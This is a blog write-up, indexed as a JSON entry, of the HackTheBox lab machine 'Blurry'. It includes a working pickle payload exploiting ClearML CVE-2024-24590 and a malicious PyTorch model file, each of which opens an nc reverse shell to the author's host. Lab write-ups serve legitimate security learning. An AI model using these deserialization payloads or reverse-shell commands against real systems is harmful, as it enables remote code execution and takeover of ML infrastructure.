[
  
    {
      "title"    : "「WriteUp」HackTheBox - Blurry",
      "category" : "",
      "tags"     : "writeup and hackthebox",
      "url"      : "/2024/06/13/writeup-hackthebox-blurry/",
      "date"     : "Jun 13, 2024",
      "content"  : "Blurry is a medium-difficulty box in the fifth season of HackTheBox in 2024.EnumerationLet’s start by enumerating.  Nmap scanThe Nmap scan report shows open ports 22 and 80.Port 80 is a web service and redirects to the domain “app.blurry.htb”.So, You need to configure the hosts file first.Since there is a web service, we should enumerate the directories.  dirsearch scanAlso, when accessing the web service through a browser,the page information indicates that the service is ClearML.  brower accessFootholdFound a ClearML-related vulnerability through Google search: CVE-2024-24590.All information about this vulnerability points to this article, which includes a detailed demonstration of how the vulnerability can be exploited:“Machine Learning Operations: What You Need to Know Now - HiddenLayer”First, install ClearML.Then, go to the settings page of the web service and copy the configuration information.The configuration information involves three addresses in the ClearML initialization settings: web_server, api_server, and files_server.We need to configure the hosts file to add the DNS entries for these three domains.10.10.11.19 app.blurry.htb\t# web_server10.10.11.19 api.blurry.htb\t# api_server10.10.11.19 files.blurry.htb\t# files_serverInitialize the ClearML configuration with the “clearml-init” command and paste the copied content.From observation, the account Black Swan repeats the “Review JSON Artifacts” task every so often.The task’s code contains the deserialization code needed to trigger the vulnerability.After a detailed code review, we can understand its logic roughly as follows:  Check all tasks with project_name “Black Swan” and tags [‘review’].  Iterate through these tasks and call artifact.get() for deserialization.  Destroy these tasks after the iteration.Based on the code audit results,we need to ensure consistency in the project_name and tags when testing with the PoC code.from clearml import Taskimport pickle, osclass RunCommand:    def __reduce__(self):        # Payload        return (os.system, (&#39;echo Hacked by b0rg | nc 10.10.14.19 14443&#39;,))command = RunCommand()project_name = &#39;Black Swan&#39;task_name = &#39;TestNotMatchTaskName&#39;tags = [&#39;review&#39;]task = Task.init(project_name, task_name, tags)task.upload_artifact(name=&#39;pickle_artifact&#39;, artifact_object=command, retries=2, wait_on_upload=True, extension_name=&#39;.pkl&#39;)Use nc to listen and execute the PoC code.After waiting for Black Swan to repeat the “Review JSON Artifacts” task, we will see message echoing in the terminal.Modify the Payload to turn the PoC code into Exploit code.nc -c bash 10.10.14.19 14443Again, listen using nc, and execute the exploit code to gain user permissions and obtain a reverse shell.Privilege EscalationUse linpeas.sh for enumeration and collect information related to privilege escalation.The scan results show that the current user has an SSH private key, which can be used for persistent access.Another interesting piece of information is that the current user has NOPASSWD sudo access.Let’s take a look at the source code of evaluate_model,we can see that evaluate_model actually calls the “/models/evaluate_model.py” file.Looking at the source code of evaluate_model.py,we can see that there is a step for loading the model,which leads us to anticipate the presence of a deserialization vulnerability.By constructing malicious model code,we can generate a custom pth file containing a reverse shell.import torchimport torch.nn as nnimport torch.nn.functional as Fimport osclass Net(nn.Module):    def __init__(self):        super(Net, self).__init__()        self.layer1 = nn.Linear(1, 128)        self.layer2 = nn.Linear(128, 128)        self.layer3 = nn.Linear(128, 2)    def forward(self, x):        x = F.relu(self.layer1(x))        x = F.relu(self.layer2(x))        action = self.layer3(x)        return action    def __reduce__(self):        return (os.system, (&#39;nc -c bash 10.10.14.19 14443&#39;,))if __name__ == &#39;__main__&#39;:    n = Net()    torch.save(n, &#39;getshell.pth&#39;)Upload this code to the machine and execute it to generate the getshell.pth file.Then, listen using nc, and execute the NOPASSWD sudo exploit.Gain administrator privileges.Nice!",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2024/06/13/writeup-hackthebox-blurry/'> <img src='/images/11.jpg' alt='「WriteUp」HackTheBox - Blurry'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>6 min read <time class='article__date' datetime='2024-06-13T16:01:35+08:00'>Jun 13, 2024</time> </span> </div><h2 class='article__title'>「WriteUp」HackTheBox - Blurry</h2> <p class='article__excerpt'>「WriteUp」HackTheBox - Blurry | b0rgch3n’s blog</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='b0rgch3n'><img class='article__author-image' src='/images/author.jpg' alt='b0rgch3n's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>b0rgch3n</a><span> in </span> <span class='article-tags'> <a href='/tag/writeup' class='article__tag'>writeup</a>  <a href='/tag/hackthebox' class='article__tag'>hackthebox</a> </span></div></div></div></div></div>"
    } 
  
]
